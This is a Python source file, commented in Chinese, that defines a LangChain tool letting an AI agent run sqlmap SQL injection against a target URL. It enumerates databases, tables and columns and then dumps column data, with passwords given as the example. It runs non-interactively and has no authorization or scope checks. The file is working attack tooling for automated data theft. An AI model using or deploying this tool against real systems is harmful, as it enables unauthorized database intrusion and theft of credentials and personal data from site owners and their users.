"""用本地 sqlmap 按「查库→查表→查字段→dump」流程做 SQL 注入。"""
import subprocess
import tempfile
from typing import Literal

from langchain_core.tools import tool

SqlmapAction = Literal["dbs", "tables", "columns", "dump"]


@tool
def sqlmap_scan(
    url: str,
    referer: str,
    action: SqlmapAction,
    method: Literal["GET", "POST", "PUT"] = "GET",
    data: str | None = None,
    database: str | None = None,
    table: str | None = None,
    columns: str | None = None,
):
    """
    按流程用 sqlmap 做 SQL 注入。必填：url、referer、action。
    action：dbs 查库；tables 查表（需 database）；columns 查字段（需 database+table）；dump 导出列数据（需 database+table+columns，如 columns=pass）。
    method：GET（默认，参数在 url 里可不传 data）、POST（需传 data）、PUT（需传 data，会自动加 Content-Type:text/plain）。
    """
    try:
        cmd = ["sqlmap", "-u", url, "--referer", referer, "--batch"]

        if method.upper() == "POST":
            if not data:
                return "错误：POST 必须提供 data"
            cmd.extend(["--data", data])
        elif method.upper() == "PUT":
            if not data:
                return "错误：PUT 必须提供 data"
            cmd.extend(["--data", data, "--method", "PUT", "--headers", "Content-Type:text/plain"])
        elif data:
            # GET 但传了 data，也加上
            cmd.extend(["--data", data])

        if action == "dbs":
            cmd.append("--dbs")
        elif action == "tables":
            if not database:
                return "错误：查表需指定 database"
            cmd.extend(["-D", database, "--tables"])
        elif action == "columns":
            if not database or not table:
                return "错误：查字段需指定 database 和 table"
            cmd.extend(["-D", database, "-T", table, "--columns"])
        elif action == "dump":
            if not database or not table or not columns:
                return "错误：dump 需指定 database、table 和 columns"
            cmd.extend(["-D", database, "-T", table, "-C", columns, "--dump"])

        cmd.extend(["--output-dir", tempfile.gettempdir()])

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

        out = []
        if result.stdout:
            out.append(result.stdout)
        if result.stderr:
            out.append(result.stderr)
        if result.returncode != 0:
            out.append(f"退出码: {result.returncode}")

        text = "\n\n".join(out) if out else "无输出"
        if not text.strip():
            return "执行完成，未发现注入或无新数据。"
        return text

    except FileNotFoundError:
        return "错误：未找到 sqlmap，请安装并加入 PATH"
    except subprocess.TimeoutExpired:
        return "错误：执行超时（5 分钟）"
    except Exception as e:
        return f"错误：{e}"
